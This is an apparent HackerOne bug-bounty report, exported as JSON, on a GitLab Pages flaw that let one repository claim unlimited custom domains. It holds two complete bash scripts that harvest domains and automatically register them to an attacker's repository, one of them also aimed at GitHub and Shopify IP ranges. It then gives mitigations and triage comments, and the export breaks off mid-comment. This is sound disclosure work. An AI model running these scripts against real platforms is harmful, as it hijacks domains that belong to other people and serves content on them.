{"id":312118,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTIxMTg=","url":"https://hackerone.com/reports/312118","title":"Using GitLab to monitor and hijack domains in mass quantity.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-02-04T14:25:08.445Z","submitted_at":"2018-02-04T14:25:08.445Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-02-21T23:46:26.928Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-02-21T23:46:09.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Vulnerability Description\n\nThere is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to `52.167.214.135`. GitLab allows setting an unlimited number of domains for a single repository. \n\nFirst, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.\n\n```bash\n#!/bin/bash\n\nsearches=(\n    \"The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it.\"\n)\n\ngron \"https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 \u003e whiteknight-temp\n\nwhile read domain; do\n    if host \"$domain\"\u003e /dev/null; then\n        echo $domain;\n    fi;\ndone \u003c whiteknight-temp \u003e\u003e domains\n\ncat domains | uniq | sed -e 's/^/https:\\/\\//' \u003e\u003e domains-to-test\n\nmeg / domains-to-test\n\nfor str in \"${searches[@]}\"; do\n    grep --color -Hnri \"$str\" out/\ndone\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓\u0026authenticity_token=████████████████\u0026pages_domain[domain]=$target\u0026pages_domain[certificate]\u0026pages_domain[key]\"\ndone \u003c domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nThen I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.\n\n```bash\n#!/bin/bash\n\nIPS=(\n    # GitLab\n    \"52.167.214.135\"\n    # GitHub\n    \"192.30.252.153\"\n    \"192.30.252.154\"\n    # Shopify\n    \"23.227.38.32\"\n)\n\nfor ip in \"${IPS[@]}\"; do\n    gron \"https://app.securitytrails.com/api/search/by_type/ip/$ip\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 \u003e whiteknight-temp\ndone\n\nwhile read domain; do\n    if host \"$domain\"\u003e /dev/null; then\n        echo $domain;\n    fi;\ndone \u003c whiteknight-temp \u003e\u003e domains\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓\u0026authenticity_token=███████████████████\u0026pages_domain[domain]=$target\u0026pages_domain[certificate]\u0026pages_domain[key]\"\ndone \u003c domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nPlease note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.\n\n# Proof of concept\n\nWith my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.\n\n# Mitigation\n\nSince this is a logic flaw, there will be multiple ways to mitigate the issue.\n\n1. You could restrict repositories to only a single custom domain — this is what GitHub does.\n2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.\n3. Not store the domain until it actually points to `52.167.214.135` — currently you store any domain pointing to various other services and IPs.\n\n## Impact\n\nGitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.","vulnerability_information_html":"\u003ch1 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h1\u003e\n\n\u003cp\u003eThere is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to \u003ccode\u003e52.167.214.135\u003c/code\u003e. GitLab allows setting an unlimited number of domains for a single repository. \u003c/p\u003e\n\n\u003cp\u003eFirst, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003esearches\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;The resource that you are attempting to access does not exist or you don\u0026#39;t have the necessary permissions to view it.\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\ngron \u003cspan class=\"s2\"\u003e\u0026quot;https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135\u0026quot;\u003c/span\u003e | fgrep \u003cspan class=\"s2\"\u003e\u0026quot;domain\u0026quot;\u003c/span\u003e | \u003cspan class=\"nb\"\u003egrep\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;[^\u0026quot;]\\+\u0026quot;\u0026#39;\u003c/span\u003e | \u003cspan class=\"nb\"\u003ecut\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-f\u003c/span\u003e 2 \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e whiteknight-temp\n\n\u003cspan class=\"k\"\u003ewhile \u003c/span\u003e\u003cspan class=\"nb\"\u003eread \u003c/span\u003edomain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    if \u003c/span\u003ehost \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$domain\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e /dev/null\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\n        \u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$domain\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; whiteknight-temp \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e domains\n\n\u003cspan class=\"nb\"\u003ecat \u003c/span\u003edomains | \u003cspan class=\"nb\"\u003euniq\u003c/span\u003e | \u003cspan class=\"nb\"\u003esed\u003c/span\u003e \u003cspan class=\"nt\"\u003e-e\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;s/^/https:\\/\\//\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e domains-to-test\n\nmeg / domains-to-test\n\n\u003cspan class=\"k\"\u003efor \u003c/span\u003estr \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esearches\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    \u003c/span\u003e\u003cspan class=\"nb\"\u003egrep\u003c/span\u003e \u003cspan class=\"nt\"\u003e--color\u003c/span\u003e \u003cspan class=\"nt\"\u003e-Hnri\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$str\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e out/\n\u003cspan class=\"k\"\u003edone\n\nwhile \u003c/span\u003e\u003cspan class=\"nb\"\u003eread \u003c/span\u003etarget\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e--silent\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://gitlab.com/███████████████████/███████████████████/pages/domains\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--compressed\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Accept-Language: en-GB,en;q=0.5\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Cache-Control: no-cache\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Connection: keep-alive\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DNT: 1\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Host: gitlab.com\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Pragma: no-cache\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;utf8=✓\u0026amp;authenticity_token=████████████████\u0026amp;pages_domain[domain]=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;pages_domain[certificate]\u0026amp;pages_domain[key]\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to \u003ccode\u003e52.167.214.135\u003c/code\u003e, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003eIPS\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\n    \u003cspan class=\"c\"\u003e# GitLab\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;52.167.214.135\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"c\"\u003e# GitHub\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;192.30.252.153\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;192.30.252.154\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"c\"\u003e# Shopify\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;23.227.38.32\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor \u003c/span\u003eip \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIPS\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    \u003c/span\u003egron \u003cspan class=\"s2\"\u003e\u0026quot;https://app.securitytrails.com/api/search/by_type/ip/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e | fgrep \u003cspan class=\"s2\"\u003e\u0026quot;domain\u0026quot;\u003c/span\u003e | \u003cspan class=\"nb\"\u003egrep\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;[^\u0026quot;]\\+\u0026quot;\u0026#39;\u003c/span\u003e | \u003cspan class=\"nb\"\u003ecut\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-f\u003c/span\u003e 2 \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e whiteknight-temp\n\u003cspan class=\"k\"\u003edone\n\nwhile \u003c/span\u003e\u003cspan class=\"nb\"\u003eread \u003c/span\u003edomain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    if \u003c/span\u003ehost \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$domain\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e /dev/null\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\n        \u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$domain\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; whiteknight-temp \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e domains\n\n\u003cspan class=\"k\"\u003ewhile \u003c/span\u003e\u003cspan class=\"nb\"\u003eread \u003c/span\u003etarget\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\n    \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e--silent\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://gitlab.com/███████████████████/███████████████████/pages/domains\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--compressed\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Accept-Language: en-GB,en;q=0.5\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Cache-Control: no-cache\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Connection: keep-alive\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;DNT: 1\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Host: gitlab.com\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Pragma: no-cache\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;utf8=✓\u0026amp;authenticity_token=███████████████████\u0026amp;pages_domain[domain]=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;pages_domain[certificate]\u0026amp;pages_domain[key]\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use \u003ccode\u003esecuritytrails.com\u003c/code\u003e to demonstrate the issue without affecting your users.\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of concept\u003c/h1\u003e\n\n\u003cp\u003eWith my colleague\u0026#39;s permission, I asked them to set an A record for their personal domain (\u003ca title=\"http://danfield.photography/\" href=\"/redirect?url=http%3A%2F%2Fdanfield.photography%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://danfield.photography/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) pointing to \u003ccode\u003e52.167.214.135\u003c/code\u003e. They set the A record \u003cstrong\u003eafter\u003c/strong\u003e I had added their domain to my repository. After a couple of minutes, their domain was serving my repository\u0026#39;s content.\u003c/p\u003e\n\n\u003ch1 id=\"mitigation\"\u003eMitigation\u003c/h1\u003e\n\n\u003cp\u003eSince this is a logic flaw, there will be multiple ways to mitigate the issue.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eYou could restrict repositories to only a single custom domain — this is what GitHub does.\u003c/li\u003e\n\u003cli\u003eRequire users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.\u003c/li\u003e\n\u003cli\u003eNot store the domain until it actually points to \u003ccode\u003e52.167.214.135\u003c/code\u003e — currently you store any domain pointing to various other services and IPs.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eGitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-03-23T23:46:09.454Z","allow_singular_disclosure_after":-87371177.27241705,"singular_disclosure_allowed":true,"vote_count":33,"voters":["jokebookservice1","sp1d3rs","europa","muon4","bl4de","ramsexy","bogdantcaciuc","yumi","emitrani","003random","and 23 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2353590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edoverflow,\n\nThank you for submitting this report. I've marked this as a duplicate of https://hackerone.com/reports/296907. We've reconsidered the issue and are implementing a short-term fix as well as a domain verification mechanism. We will keep you updated on our progress via HackerOne.\n\nFeel free to contact us at anytime if you need an update\n\nBest regards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edoverflow\"\u003e@edoverflow\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. I\u0026#39;ve marked this as a duplicate of \u003ca title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\"\u003ehttps://hackerone.com/reports/296907\u003c/a\u003e. We\u0026#39;ve reconsidered the issue and are implementing a short-term fix as well as a domain verification mechanism. We will keep you updated on our progress via HackerOne.\u003c/p\u003e\n\n\u003cp\u003eFeel free to contact us at anytime if you need an update\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-05T21:47:53.899Z","updated_at":"2018-02-05T21:47:53.899Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2353594,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Duplicate of https://hackerone.com/reports/296907","markdown_message":"\u003cp\u003eDuplicate of \u003ca title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\"\u003ehttps://hackerone.com/reports/296907\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-05T21:49:27.091Z","updated_at":"2018-02-05T21:49:27.091Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2353652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jritchey,\n\nWhile what I have demonstrated here might have a similar outcome as in #296907, this is in fact a different attack vector. #296907 is simply concerning unclaimed domains — as Brian pointed out, an issue caused by the user. My report on the other hand is a design flaw from your side — you allow setting an unlimited number of domains and on top of that, you allow users to squat domains that are not even pointing to `52.167.214.135` in the first place. I, hereby, kindly request you review this report again. There appears to be a misunderstanding — I would definitely not go out of my way to report a previously-disclosed report to you.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWhile what I have demonstrated here might have a similar outcome as in \u003ca href=\"/reports/296907\"\u003e#296907\u003c/a\u003e, this is in fact a different attack vector. \u003ca href=\"/reports/296907\"\u003e#296907\u003c/a\u003e is simply concerning unclaimed domains — as Brian pointed out, an issue caused by the user. My report on the other hand is a design flaw from your side — you allow setting an unlimited number of domains and on top of that, you allow users to squat domains that are not even pointing to \u003ccode\u003e52.167.214.135\u003c/code\u003e in the first place. I, hereby, kindly request you review this report again. There appears to be a misunderstanding — I would definitely not go out of my way to report a previously-disclosed report to you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-05T22:15:42.277Z","updated_at":"2018-02-05T22:20:56.661Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2359966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I really think that there was a grave misunderstanding here and I can assure you that this is not the same attack vector as #296907. Please do review this report again as I believe it would be a shame to end this report on this note.","markdown_message":"\u003cp\u003eI really think that there was a grave misunderstanding here and I can assure you that this is not the same attack vector as \u003ca href=\"/reports/296907\"\u003e#296907\u003c/a\u003e. Please do review this report again as I believe it would be a shame to end this report on this note.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T18:37:00.874Z","updated_at":"2018-02-07T18:37:00.874Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2360123,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm investigating this further and will get back to you as soon as I can.","markdown_message":"\u003cp\u003eI\u0026#39;m investigating this further and will get back to you as soon as I can.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T19:25:29.779Z","updated_at":"2018-02-07T19:25:29.779Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2360124,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you, @jritchey.","markdown_message":"\u003cp\u003eThank you, \u003ca 